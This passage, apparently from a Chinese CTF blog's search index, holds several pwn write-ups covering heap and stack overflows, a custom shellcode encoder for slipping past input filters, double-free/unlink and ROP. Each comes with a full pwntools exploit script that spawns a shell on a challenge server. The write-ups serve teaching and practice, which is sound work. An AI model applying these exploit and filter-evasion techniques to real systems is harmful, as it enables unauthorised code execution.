elf.got[&#x27;atoi&#x27;]  ptr = 0x804B1C0    def add(count,content):     sh.sendlineafter(&#x27;choose:&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;5.Jianjiao&#x27;,content)     sh.sendlineafter(&#x27;How many?&#x27;,count)    def delete():     sh.sendlineafter(&#x27;choose:&#x27;,&#x27;2&#x27;)    def show():     sh.sendlineafter(&#x27;choose:&#x27;,&#x27;4&#x27;)    sh.sendlineafter(&#x27;Your Address:&#x27;,&#x27;seaase&#x27;)  fake_chunk = p32(0) + p32(0x31)  #为了能够控制堆指针ptr，我们在ptr上面可控靠近区伪造一个0x31的假chunk链接到fastbin，然后申请到这里即可  payload = &#x27;d&#x27;*(0x100-0x10) + fake_chunk  sh.sendlineafter(&#x27;Your Phone number:&#x27;,payload)    #头插法建立链表,chunk0最后被释放  add(&#x27;10&#x27;,&#x27;a&#x27;) #0  add(&#x27;10&#x27;,&#x27;b&#x27;) #1  add(&#x27;10&#x27;,&#x27;c&#x27;) #2  #释放链表，但不清空指针  delete()  #把chunk0申请回来，并且在chunk0代表的结构体链表链接上puts的got表地址，这样我们再次show的时候就可以泄露信息  payload = &#x27;a&#x27;*0x20 + p32(puts_got-0x4)  #prev_size size fd  payload += p32(0) + p32(0x31) + p32(ptr-0x10) #chunk1  add(&#x27;10&#x27;,payload)  show()  sh.recvuntil(&#x27;* 10\\n&#x27;)  puts_addr = u32(sh.recv(4))  #print &#x27;puts_addr=&#x27;,hex(puts_addr)  libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)  libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  add(&#x27;10&#x27;,&#x27;b&#x27;) #chunk1  #申请堆块到ptr上方的假chunk处，将ptr指针覆盖为atoi的got地址，同时修改atoi的got表  add(str(system_addr - 0x100000000),&#x27;dddd&#x27; + p32(atoi_got))  #getshell  sh.sendline(&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["堆溢出","UAF","fastbin"]},{"title":"shell","url":"/2019/11/22/shell/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析\n\n\n存在栈溢出漏洞\n我们先运行程序，发现可以直接输命令\n\n\n然而，其他命令都不可用，需要登录成功才能用\n\n\n我们看看登录的逻辑\n\n\n程序从creds.txt文件中一行一行的读取，取第一个冒号后面的内容为用户名，取第二个冒号后面的内容为密码\n只要我们输入的用户名和密码存在于那个文件，就登录成功，然后就能执行shell\n\n\n\n\nMain函数里最外层是死循环，因此我们不能结束它，也就不能ROP\n\n\n我们可以把filename指针覆盖成其他地方啊，查看一下文件中的字符串\n\n\n这个可以用，我们就把filename指针指向这个字符串吧，这样，程序第二次循环就从&#x2F;lib64&#x2F;ld-linux-x86-64.so.2文件中读取,由于我们本地也用这个文件，我们可以找找里面的字符串有没有符合条件的\n#include &lt;stdio.h&gt;    int main() &#123;      FILE *f = fopen(&quot;/lib64/ld-linux-x86-64.so.2&quot;,&quot;r&quot;);      char *buf = NULL;      size_t n;      if (f == NULL) &#123;          printf(&quot;error\\n&quot;);      &#125;      while (getline(&amp;buf,&amp;n,f) != -1) &#123;          char* user = strtok(buf, &quot;:&quot;);          char* pwd = strtok(0LL, &quot;:&quot;);          printf(&quot;%s:%s\\n&quot;,user,pwd);      &#125;      fclose(f);      return 0;  &#125;  \n\n我们发现，这些都可以使用\n\n\n那么我们就随便选一组即可\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    sh = remote(&#x27;111.198.29.45&#x27;,58711)    #sh = process(&#x27;./shell&#x27;)  sh.sendline(&#x27;login&#x27;)  sh.sendlineafter(&#x27;Username: &#x27;,&#x27;sea&#x27;)  #溢出栈覆盖filename，使得程序读取/lib64/ld-linux-x86-64.so.2文件中的内容  payload = &#x27;a&#x27;*0x44 + p64(0x400200)  sh.sendlineafter(&#x27;Password: &#x27;,payload)    sh.sendlineafter(&#x27;Authentication failed!&#x27;,&#x27;login&#x27;)  sh.sendlineafter(&#x27;Username: &#x27;,&#x27;relocation processing&#x27;)  sh.sendlineafter(&#x27;Password: &#x27;,&#x27; %s%s&#x27;)    sh.sendlineafter(&#x27;Authenticated!&#x27;,&#x27;sh&#x27;)      sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","变量覆盖"]},{"title":"Shellcode加密原理之自己动手写加密器","url":"/2020/02/20/shellcode_enc/","content":"shellcode是一段用于利用软件漏洞而执行的代码，在实际的软件中，某些软件对允许输入的字符范围做了限制，导致检测到非法字符，从而无法成功输入shellcode。这时就需要加密shellcode。谷歌有一个开源工具ALPHA 3，可以将shellcode加密为全ascii可见字符。其大致原理根本文我们讲的是差不多的。\n本文，我们要自己实现一个shellcode加密。我们就从攻防世界的一题holy_shellcode来看吧。这题的附件，攻防世界上没有，到这里下载https://pwn-1253291247.cos.ap-chengdu.myqcloud.com/holy_shellcode\n我们用IDA分析一下\n这里会把shellcode[i]和shellcode[i+1]替换为固定值\n\n\n那么，我们必须要让i的值尽可能大，这样，在前面我们才能放置解密代码。我们来看看filter函数\n\n\n有一个循环，循环到a1结束，而a1是传入的参数0xFA0，而最后函数返回的是i，那么我们想让i尽可能大，就是要让这个循环一直做到完，而不会中途返回\n\n\n\n\n只要我们的shellcode里面字符在某个范围，就不会return。经过我们的分析，程序把我们输入的字符串分成2字节一组，当后一字节为0x05时，检查前一字节允许的范围；当后一字节为0xFB时，检查前一字节允许的范围。我们分析出的范围如下\n#后一个字节是05，允许的字节码范围  opcode_05_allowed = range(145,200) + range(208,235) + range(240,245)  #后一个字节是fb，允许的字节码范围  opcode_fb_allowed = range(31,41) + range(42,55) + range(56,61) + [62,64]  \n\n我们要利用这些范围内的字符，构造解密函数。我们找到一个比较重要的指令**[stosb]{.mark}，在i386上，它的机器码为0xAA，在opcode_05_allowed的范围内。[这条指令的作用是将eax的低一字节al里面的数据写入到edi所指向的地址处，同时edi加1。]{.mark}**\n那么，我们可以**[将数据放在eax的1字节寄存器al里，利用stosb写到指定的位置处。]{.mark}显然，上面允许的范围不能直接表示字节范围0~0xFF的所有，但是，[我们可以通过加减法来凑出其他数据]{.mark}**，通过对eax的加减法，让al里的数据变成我们需要表示的数据，然后再用stosb传送即可。于是，我们又有了这些范围\n#可以通过一次加法得到的字节码范围  #其中a来自opcode_05_allowed,b来自opcode_fb_allowed  opcode_can_add_possible = &#123;&#125;  for a in opcode_05_allowed:     for b in opcode_fb_allowed:        x = a + b        if x &lt;= 0xFF:           arr = [a,b]           opcode_can_add_possible[x] = arr  #可以通过一次减法得到的字节码范围  opcode_can_sub_possible = &#123;&#125;  for a in opcode_05_allowed:     for b in opcode_fb_allowed:        x = a - b        if x &gt; 0:           arr = [a,b]           opcode_can_sub_possible[x] = arr  for a in opcode_05_allowed:     for b in opcode_05_allowed:        x = a - b        if x &gt;= 0:           arr = [a,b]           opcode_can_sub_possible[x] = arr  \n\n经过输出观察上面这四个数组里的数据，发现已经可以表示出0~0xFF的所有字节了。如果还不能表示，我们可以再多几个运算，直到可以表示即可。\n而我们发现还有一条指令**[add eax,0x12345678这条5字节指令，add eax正好是0x05]{.mark}，这样有助于我们凑出0x05字节，用作对前一字节的限定。此外,[repne是一条1字节指令，机器码为0Xf2，范围在]{.mark}opcode_05_allowed[允许的范围内，并且本次这个程序的ecx值为1，所以有repne和没有repne的作用是一样的，那么，这条指令也可以用来填充add eax,0xXXXXXXXX指令]{.mark}**\n当然，本程序由于缺陷，第一次在0x05的范围内，即使被check 1了，也没关系\n\n\n只需保证第二次的时候，check 0，那么第三次就可以继续循环了。\n\n\n那么，咱们开始来来写解密代码吧。\n首先，我们需要给edi赋值一个地址，用于存放我们解密后的shellcode。程序中，eax存放了我们输入的加密的shellcode的地址。\n\n\n那么，我们先把eax与edi的值交换一下，这样，edi里就有我们当前自己这个shellcode本身的地址。使用指令xchg eax,edi，这是一条一字节指令，字节码范围在05的范围内，于是，我们得在后面填充一个0x5字节，此时，我们就可以用add eax,0xXXXXXXXX来填充。然后，我们让edi加上一定的偏移，这样我们放解密的shellcode到那里。我们可以对edi进行两次异或**[‘x33xFB’ 正好是xor edi,ebx指令，并且在允许的范围内。]{.mark}**\ndef init_edi():     #=======================将将shellcode地址放到edi里，并将edi+0x700，我们解密后的shellcode将会放到edi+0x700处====================     #将shellcode地址放到edi里     sc = asm(&#x27;xchg eax,edi&#x27;)     #这个数据没用，只是为了凑出字05字节，绕过检查     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     #这里六句的目的是让edi加0x700，也就是，我们解密时shellcode将会放到shllcode+0x700处     sc += asm(&#x27;mov ebx,0xF0FB2305&#x27;)     #这个数据没用，只是为了凑出字05字节，绕过检查     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     sc += &#x27;\\x33\\xFB&#x27; #xor edi,ebx     sc += asm(&#x27;mov ebx,0xF0FB2A05&#x27;)     #这个数据没用，只是为了凑出字05字节，绕过检查     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     sc += &#x27;\\x33\\xFB&#x27; #xor edi,ebx     return sc     #============================================================================================================================  \n\n上面的运算，其实就是edi &#x3D; edi ^ 0xF0FB2305 ^ 0xF0FB2A05 &#x3D; edi ^ 0x300 ^ 0xA00 &#x3D; edi ^ 0x900经过调试,edi最终加了0x700。\n初始化了edi以后，我们就可以用add eax,xxxxxxx等一系列的计算，让al为我们需要的数据，然后利用stosb传送到edi指向的地址处即可。\n#将al加上指定数  def add_al_xx(data):     #ecx是1，绕过ecx不是1，则还需改一下，但是本程序ecx是1     #因此功能上不加rep和加rep是一样的     #这里的rep只是起到填充的作用，使得05位于偶数位置     sc = &#x27;\\xF2&#x27; #repne     if data in opcode_fb_allowed:        print &#x27;&#123;&#125; -&gt; &#123;&#125;&#x27;.format(hex(data),hex(data))        sc += asm(&#x27;add eax,0xFB32FB&#x27; + hex(data)[2:]) #我们只需要把数据放eax的最后一字节即可     elif data in opcode_05_allowed:        print &#x27;&#123;&#125; -&gt; &#123;&#125;&#x27;.format(hex(data),hex(data))        sc += asm(&#x27;add eax,0xFB3205&#x27; + hex(data)[2:])     else:        if data in opcode_can_add_possible:           a = opcode_can_add_possible[data][0]           b = opcode_can_add_possible[data][1]           print &#x27;&#123;&#125; -&gt; &#123;&#125; + &#123;&#125;&#x27;.format(hex(data),hex(a),hex(b))           sc += asm(&#x27;add eax,0xFB3205&#x27; + hex(a)[2:])           sc += add_al_xx(b) #递归调用        elif data in opcode_can_sub_possible:           a = opcode_can_sub_possible[data][0]           b = opcode_can_sub_possible[data][1]           print &#x27;&#123;&#125; -&gt; &#123;&#125; - &#123;&#125;&#x27;.format(hex(data),hex(a),hex(b))           sc += asm(&#x27;add eax,0xFB3205&#x27; + hex(a)[2:])           #注意，为了不影响指令，我们这里仍然用add指令，而不是sub指令，只不过，我们传入的数据是0x100-b，也就是得到-b的补码           sc += add_al_xx(0x100-b) #递归调用        else:        else:           print &#x27;字节(&#x27;,hex(data),&#x27;)不在允许的范围内，无法完成加密！&#x27;           exit()     return sc  \n\n我们在用add_al_xx的时候，还需要先把al清零，我们可以利用减法，但是减法指令的机器码范围在0xFB的范围，这意味着，我们只能sub al,0xFB，而mov al指令机器码范围在0x5的范围内，这意味着，我们只能mov al,0x5。那么我们想让al为0，可以这样，让al &#x3D; 0x5 + 0xF1，然后sub al,0xFB两次，这会造成al溢出，但是没关系，最后al会变成0。\n#目的是让al为0，计算为0x5+0xF1-0xFB-0xFB = 0，也就是发生了溢出  mov_al_0 = asm(&#x27;mov al,0x5&#x27;) + add_al_xx(0xF1) + asm(&#x27;sub al,0xFB&#x27;)*2  \n\n有了这些，我们就可以开始编码了\n#加密1个字节数据  def genData(data):     #设置al为0     sc = mov_al_0     #设置al为我们的数据     sc += add_al_xx(data)     #print binascii.b2a_hex(sc)     #raw_input()     #将al里的数据写到edi所指向的地址，同时edi加1     sc += asm(&#x27;stosb&#x27;)     #这里也只是起到填充的作用     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     return sc  \n\n最后，我们只需要在结尾填充n个无用而不会被check的指令，直到填到解密后的shellcode处停止，这样是为了让程序能够运行到我们的解密后的shellcode处。如果jmp指令范围在内，我们可以直接jmp，但是jmp指令机器码超出了这个程序允许的范围。\n因特尔指令参考http://ref.x86asm.net/coder32.html手册\n\n\n综上，我们的加密脚本\n#coding:utf8  from pwn import asm,shellcraft,context,process,remote  import binascii    context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,47277)  sh = process(&#x27;./holy_shellcode&#x27;)    #后一个字节是05，允许的字节码范围  opcode_05_allowed = range(145,200) + range(208,235) + range(240,245)  #后一个字节是fb，允许的字节码范围  opcode_fb_allowed = range(31,41) + range(42,55) + range(56,61) + [62,64]  #可以通过一次加法得到的字节码范围  #其中a来自opcode_05_allowed,b来自opcode_fb_allowed  opcode_can_add_possible = &#123;&#125;  for a in opcode_05_allowed:     for b in opcode_fb_allowed:        x = a + b        if x &lt;= 0xFF:           arr = [a,b]           opcode_can_add_possible[x] = arr  #可以通过一次减法得到的字节码范围  opcode_can_sub_possible = &#123;&#125;  for a in opcode_05_allowed:     for b in opcode_fb_allowed:        x = a - b        if x &gt; 0:           arr = [a,b]           opcode_can_sub_possible[x] = arr  for a in opcode_05_allowed:     for b in opcode_05_allowed:        x = a - b        if x &gt;= 0:           arr = [a,b]           opcode_can_sub_possible[x] = arr      #经过验证，上面的5个数组范围已经能表示0~0xFF的值了  &#x27;&#x27;&#x27;&#x27;&#x27;x = opcode_05_allowed + opcode_fb_allowed + opcode_can_add_possible.keys() +  opcode_can_sub_possible.keys() x = list(set(x)) #print len(x) for i in x:    print hex(i) &#x27;&#x27;&#x27;    def init_edi():     #=======================将将shellcode地址放到edi里，并将edi+0x700，我们解密后的shellcode将会放到edi+0x700处====================     #将shellcode地址放到edi里     sc = asm(&#x27;xchg eax,edi&#x27;)     #这个数据没用，只是为了凑出字05字节，绕过检查     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     #这里六句的目的是让edi加0x700，也就是，我们解密时shellcode将会放到shllcode+0x700处     sc += asm(&#x27;mov ebx,0xF0FB2305&#x27;)     #这个数据没用，只是为了凑出字05字节，绕过检查     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     sc += &#x27;\\x33\\xFB&#x27; #xor edi,ebx     sc += asm(&#x27;mov ebx,0xF0FB2A05&#x27;)     #这个数据没用，只是为了凑出字05字节，绕过检查     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     sc += &#x27;\\x33\\xFB&#x27; #xor edi,ebx     return sc     #============================================================================================================================    #将al加上指定数  def add_al_xx(data):     #ecx是1，绕过ecx不是1，则还需改一下，但是本程序ecx是1     #因此功能上不加rep和加rep是一样的     #这里的rep只是起到填充的作用，使得05位于偶数位置     sc = &#x27;\\xF2&#x27; #repne     if data in opcode_fb_allowed:        print &#x27;&#123;&#125; -&gt; &#123;&#125;&#x27;.format(hex(data),hex(data))        sc += asm(&#x27;add eax,0xFB32FB&#x27; + hex(data)[2:]) #我们只需要把数据放eax的最后一字节即可     elif data in opcode_05_allowed:        print &#x27;&#123;&#125; -&gt; &#123;&#125;&#x27;.format(hex(data),hex(data))        sc += asm(&#x27;add eax,0xFB3205&#x27; + hex(data)[2:])     else:        if data in opcode_can_add_possible:           a = opcode_can_add_possible[data][0]           b = opcode_can_add_possible[data][1]           print &#x27;&#123;&#125; -&gt; &#123;&#125; + &#123;&#125;&#x27;.format(hex(data),hex(a),hex(b))           sc += asm(&#x27;add eax,0xFB3205&#x27; + hex(a)[2:])           sc += add_al_xx(b) #递归调用        elif data in opcode_can_sub_possible:           a = opcode_can_sub_possible[data][0]           b = opcode_can_sub_possible[data][1]           print &#x27;&#123;&#125; -&gt; &#123;&#125; - &#123;&#125;&#x27;.format(hex(data),hex(a),hex(b))           sc += asm(&#x27;add eax,0xFB3205&#x27; + hex(a)[2:])           #注意，为了不影响指令，我们这里仍然用add指令，而不是sub指令，只不过，我们传入的数据是0x100-b，也就是得到-b的补码           sc += add_al_xx(0x100-b) #递归调用        else:           print &#x27;字节(&#x27;,hex(data),&#x27;)不在允许的范围内，无法完成加密！&#x27;           exit()     return sc    #目的是让al为0，计算为0x5+0xF1-0xFB-0xFB = 0，也就是发生了溢出  mov_al_0 = asm(&#x27;mov al,0x5&#x27;) + add_al_xx(0xF1) + asm(&#x27;sub al,0xFB&#x27;)*2      #加密1个字节数据  def genData(data):     #设置al为0     sc = mov_al_0     #设置al为我们的数据     sc += add_al_xx(data)     #print binascii.b2a_hex(sc)     #raw_input()     #将al里的数据写到edi所指向的地址，同时edi加1     sc += asm(&#x27;stosb&#x27;)     #这里也只是起到填充的作用     sc += asm(&#x27;add eax,0xFB32FB32&#x27;)     return sc    def compileShellcode(shell):     shellcode = init_edi()     for data in shell: #加密shellcode        shellcode += genData(ord(data))     length = len(shellcode)     #填充剩余的空间     padding = 0x700 - length     if padding &lt; 0:        print &#x27;错误,解密逻辑过长，请调整解密的汇编代码。&#x27;        exit()     for i in range(0,padding,2):        shellcode += asm(&#x27;sub al,0xFB&#x27;)     return shellcode    shell = asm(shellcraft.i386.linux.sh())  shellcode = compileShellcode(shell)  sh.sendline(shellcode)    sh.interactive()  ","categories":["CTF"],"tags":["shellcode"]},{"title":"sleepyHolder_hitcon_2016(fastbin的检查机制+malloc_consolidate+double free)","url":"/2020/04/30/sleepyHolder_hitcon_2016/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下,delete功能没有清空指针，并且也没有校验，因此可以double free。\n\n\nEdit功能又验证标志，因此不能UAF编辑\n\n\nAdd功能可以创建三种规格的堆。\n\n\n由于没有开启PIE，并且堆指针存储在bss上，因此unlink是比较好的方法。但是不能溢出，而要想成功double free，仅一个fastbin的chunk不行。[Fastbin对double free的检查机制是仅仅检查fastbin的头chunk是否与当前要释放的这个相同size的chunk地址一样。]{.mark}\n因此，我们可以利用malloc_consolidate，来将fastbin的chunk从fastbin里卸下来，触发malloc_consolidate的条件是申请一个大的堆，功能里正好有这个功能。**[malloc_consolidate的功能就是把chunk从fastbin取出，相邻的chunk进行合并，并且会设置下一个chunk的prev_inuse位为0。]{.mark}**当chunk从fastbin里取出后，我们就可以在再一次free这个chunk了，此时，fastbin里没有形成循环链表，一个chunk在fastbin，一个chunk在unosrted bin。关键的一点是下一个chunk的prev_inuse已经清零，我们将fastbin里的那个chunk申请回来，伪造一个chunk，然后释放下一个unsorted bin范围的chunk，就会发生unlink。\nUnlink以后，实现了任意地址读写，改写got表\n#coding:utf8from pwn import *from LibcSearcher import *#sh = process(&#x27;./sleepyHolder_hitcon_2016&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25929)elf = ELF(&#x27;./sleepyHolder_hitcon_2016&#x27;)free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]atoi_got = elf.got[&#x27;atoi&#x27;]small_buf_addr = 0x00000000006020D0def add(type,content):   sh.sendlineafter(&#x27;3. Renew secret\\n&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;What secret do you want to keep?&#x27;,str(type))   sh.sendafter(&#x27;Tell me your secret:&#x27;,content)def delete(type):   sh.sendlineafter(&#x27;3. Renew secret\\n&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Which Secret do you want to wipe?&#x27;,str(type))def edit(type,content):   sh.sendlineafter(&#x27;3. Renew secret\\n&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Which Secret do you want to renew?&#x27;,str(type))   sh.sendafter(&#x27;Tell me your secret:&#x27;,content)add(1,&#x27;a&#x27;*0x20)add(2,&#x27;b&#x27;*0x20)#1放入fastbindelete(1)#触发malloc_consolidate整理fastbin放入smallbinadd(3,&#x27;c&#x27;*0x20)#由于fastbin的double free仅仅是比较fastbin头与当前free的chunk是否一样#由于malloc_consolidate把fastbin里的chunk给取出来了，因此又可以free一次了#并且chunk2的size的prev_inuse已经清零#现在可以再一次free fastbin了delete(1)#伪造chunk1payload = p64(0) + p64(0x21)#fd、bkpayload += p64(small_buf_addr - 0x18) + p64(small_buf_addr - 0x10)#prev_sizepayload += p64(0x20)add(1,payload)#unlinkdelete(2)#修改big_buf、small_buf指针payload = &#x27;\\x00&#x27;*0x8 + p64(free_got) + p64(0) + p64(small_buf_addr - 0x10) + p64(1)edit(1,payload)#修改free的got表为puts的plt表edit(2,p64(puts_plt))#修改big_buf、small_buf指针payload = p64(atoi_got) + p64(0) + p64(atoi_got) + p64(1) + p64(1)edit(1,payload)#泄露atoi地址delete(1)sh.recvuntil(&#x27;2. Big secret\\n&#x27;)atoi_addr = u64(sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;atoi&#x27;,atoi_addr)libc_base = atoi_addr - libc.dump(&#x27;atoi&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改atoi的got表为systemedit(2,p64(system_addr))#getshellsh.sendlineafter(&#x27;3. Renew secret\\n&#x27;,&#x27;sh\\x00&#x27;)sh.interactive()","categories":["CTF"],"tags":["double free","unlink","unsorted bin","fastbin","malloc_consolidate"]},{"title":"Stackoverflow(栈溢出盲打)","url":"/2020/01/28/stackoverflow/","content":"这题，没有提供给我们二进制文件，仅仅有一个可交互的地址。由题意也可以知道，它存在栈溢出。这是一个**[栈溢出盲打]{.mark}**的题目。\n首先，就是确定栈溢出的长度\n\n\n我们发现，当我们**[输入23个整数后，就发生了溢出]{.mark}**报错，同时，我们也知道了,这个程序开启了canary机制，这正好被我们利用起来判断栈溢出的长度。\n接下来，就是泄露栈数据了，主要依靠功能3，它会把数组里的数据相邻的去重后输出\n\n\n但这似乎不容易发现什么，我们不如转换成十六进制，来观察\ndef getStackData():     data = []     changeNum(50)     unique()     data_s = (sh.recvuntil(&#x27;\\n&#x27;,drop = True).strip(&#x27; &#x27;)).split(&#x27; &#x27;)     for s in data_s:        x = int(s,10)        if x &lt; 0:           x = 0x100000000 + x        data.append(x)     return data  \n\n\n\n我们需要确定程序位数，一开始，我以为程序是32位的，以为这里面数据都是4字节，后来分析，发现32位的话，分析不出什么信息，我们看到栈里面有一个数据是一直没变,并且有些数据末尾3个十六进制数据也没变\n\n\n0x401020应该是程序里的某个地方，而0x______830应该是libc中的某个地方，并且64位程序如果没开启PIE,程序的加载基址就是从0x400000开始，由此，我们可以判断这是一个64位的程序，那么就能解释的通顺了,0x401020是main函数的ebp处，前面两个4字节数据构成了8字节的canary,而0x7f6c和0xbdfbb**[830]{.mark}构成了libc_start_main里的某处地址，看末尾的[830]{.mark}**数据，根据经验，以及日常刷题的熟练，感觉很眼熟，这好像是libc2.23版本里面的，于是，我们在glibc2.23环境下，随便运行一个二进制文件，观察栈布局\n\n\n那么，我们可以确定，程序的glibc就是2.23版本，那么我们就能计算出glibc基地址，进而计算出需要的函数即字符串的地址。那么接下来的操作就是一个简单的栈溢出操作，只不过，我们在写数据的时候，需要把8字节数据拆分后再写。为了调用system(“&#x2F;bin&#x2F;sh”)，在64位程序下，我们还需要pop rdi;ret这个gadget，我们可以在libc2.23中查找。\n\n\n综上，我们的exp脚本如下\n#coding:utf8  from pwn import *  import numpy as np    sh = remote(&#x27;111.198.29.45&#x27;,46999)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  system_s = libc.sym[&#x27;system&#x27;]  binsh_s = libc.search(&#x27;/bin/sh&#x27;).next()  pop_rdi = 0x21102    def unique():     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)    def changeNum(num):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)     sh.sendline(str(num))    def setArray(arr):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)     sh.recvuntil(&#x27;num:&#x27;)     for x in arr:        sh.sendline(str(x))    def getStackData():     data = []     changeNum(50)     unique()     data_s = (sh.recvuntil(&#x27;\\n&#x27;,drop = True).strip(&#x27; &#x27;)).split(&#x27; &#x27;)     for s in data_s:        x = int(s,10)        if x &lt; 0:           x = 0x100000000 + x        #print hex(x)        data.append(x)     return data    #将8字节数据拆分为2个4字节  def split_data(data):     data0 = data &amp; 0xFFFFFFFF     if data0 &amp; 0x80000000 != 0:        data0 = -0x100000000 + data0       data1 = (data &amp; 0xFFFFFFFF00000000) &gt;&gt; 32     if data1 &amp; 0x80000000 != 0:        data1 = -0x100000000 + data1     return [data0,data1]    #经过测试,缓冲区大小为22个int，下一个区域就是canary  sh.sendlineafter(&#x27;input n:&#x27;,&#x27;22&#x27;)  #初始化输入全0  setArray(np.zeros(22,dtype=int))    data = getStackData()  #程序是64位的，数据被截成两部分了  canary0 = data[1]  canary1 = data[2]    #判断四字节数据是否为负数，是则需要转换回去  if canary0 &amp; 0x80000000 != 0:     canary0 = -0x100000000 + canary0    if canary1 &amp; 0x80000000 != 0:     canary1 = -0x100000000 + canary1      __libc_start_main_F0 = (data[6] &lt;&lt; 32) + data[5]  __libc_start_main_addr = __libc_start_main_F0 - 0xF0  libc_base = __libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]  system_addr = libc_base + system_s  binsh_addr = libc_base + binsh_s  pop_rdi_addr = libc_base + pop_rdi    print &#x27;libc base=&#x27;,hex(libc_base)    #拆分8字节数据为4字节  pop_rdi_addr = split_data(pop_rdi_addr)  binsh_addr = split_data(binsh_addr)  system_addr = split_data(system_addr)      changeNum(32)  arr = list(np.zeros(22,dtype=int))  arr.append(canary0)  arr.append(canary1)  arr.append(0)  arr.append(0)  arr.append(pop_rdi_addr[0])  arr.append(pop_rdi_addr[1])  arr.append(binsh_addr[0])  arr.append(binsh_addr[1])  arr.append(system_addr[0])  arr.append(system_addr[1])    setArray(arr)  #getshell  sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)    sh.interactive()  \n\n总结：对于盲打类型的题目，要熟悉栈的布局，熟悉一些常用的libc版本的地址，感兴趣的可以做一个libc_start_main+XX的数据库，用来查询libc版本，方便以后使用。\n","categories":["CTF"],"tags":["栈溢出","盲打"]},{"title":"starctf2018_note(栈上的null off by one)","url":"/2020/07/25/starctf2018_note/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在add函数里的scanf(“%256s”,&amp;s)存在null off by one，其结果是将在栈里的rbp值低1字节覆盖为0。\n\n\n将栈里rbp的值低1字节覆盖为0后，其结果导致main函数的rbp上移，这样，我们就可以在add里的可控缓冲区里控制main函数里scanf的格式化字符串指针，我们将其修改为%236s的地址，这样就能在main函数里进行栈溢出，做ROP。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./note&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,28076)libc = ELF(&#x27;./libc-2.23.so&#x27;)pop_rdi = 0x0000000000401003pop_rsi = 0x0000000000401001#pop rbp ; pop r14 ; pop r15 ; retpop_rbp = 0x0000000000400fffpop_rsp = 0x0000000000400ffdbss = 0x0000000000602800puts_got = 0x0000000000601F90scanf_got = 0x0000000000601FF0format_str = 0x0000000000401129jmp_ptr_rbp = 0x00000000004012B3def add(content):   sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Note:&#x27;,content)sh.sendlineafter(&#x27;Input your ID:&#x27;,&#x27;haivk&#x27;)#通过null off by one修改了rbp，这样在main里的scanf的格式化控制字符串就能转移到我们能够控制的地方，我们将%d改为了%256s，#这样在main里的scanf就可以溢出了payload = &#x27;a&#x27;*0xA8 + p64(format_str)payload = payload.ljust(0x100,&#x27;a&#x27;)#null off by oneadd(payload)payload = &#x27;a&#x27;*0x64payload += p64(pop_rdi)payload += p64(puts_got)payload += p64(pop_rbp)payload += p64(puts_got)payload += p64(0)*2payload += p64(jmp_ptr_rbp)payload += p64(pop_rdi)payload += p64(format_str)payload += p64(pop_rsi)payload += p64(bss)payload += p64(0)payload += p64(pop_rbp)payload += p64(scanf_got)payload += p64(0)*2payload += p64(jmp_ptr_rbp)payload += p64(pop_rsp)payload += p64(bss)sh.sendlineafter(&#x27;&gt;&#x27;,payload)sh.recv(1)puts_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;binsh_addr=&#x27;,hex(binsh_addr)sleep(0.2)payload = &#x27;a&#x27;*0x18 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.interactive()","categories":["CTF"],"tags":["ROP","变量覆盖","off by one","栈迁移"]},{"title":"starctf_2019_quicksort","url":"/2020/07/24/starctf_2019_quicksort/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，栈溢出，可以将ptr指针覆盖掉，因此，我们可以任意地址写。\n\n\n那么，我们可以将free的got表修改为main函数，这样就可以进行多次利用，同时后面的printf可以泄露地址\n\n\n#coding:utf8from pwn import *from LibcSearcher import *#sh = process(&#x27;./starctf_2019_quicksort&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23_x86.so&#x27;&#125;)sh = 